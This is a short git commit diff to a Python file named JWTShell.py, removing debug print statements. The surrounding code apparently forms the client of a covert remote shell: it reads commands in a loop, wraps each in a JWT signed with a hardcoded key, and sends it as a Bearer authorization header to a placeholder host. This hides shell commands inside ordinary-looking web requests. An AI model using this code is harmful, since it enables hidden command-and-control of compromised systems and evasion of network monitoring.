ab1c3f5d6b52748e756163a11a34bf9d6e4ab6b7
Gareth Williams <42007972+garethwilliams82@users.noreply.github.com>
2022-09-24 20:38:40 +0100

    Update JWTShell.py

--- JWTShell.py
+++ JWTShell.py
@@ -7,10 +7,7 @@ while True:
         cmd = input(prompt)
         encoded_jwt = jwt.encode({'xxx': cmd}, 'PASS', algorithm='HS256')
         string1_aft_decode = codecs.decode(encoded_jwt)
-        print(cmd)
-        print(string1_aft_decode)
         payload = 'Bearer ' + string1_aft_decode
-        print(payload)
         headers = {'authorization': payload}
         x = requests.Session()
         x = requests.get('http://x.x.x.x:xxxx', headers=headers)
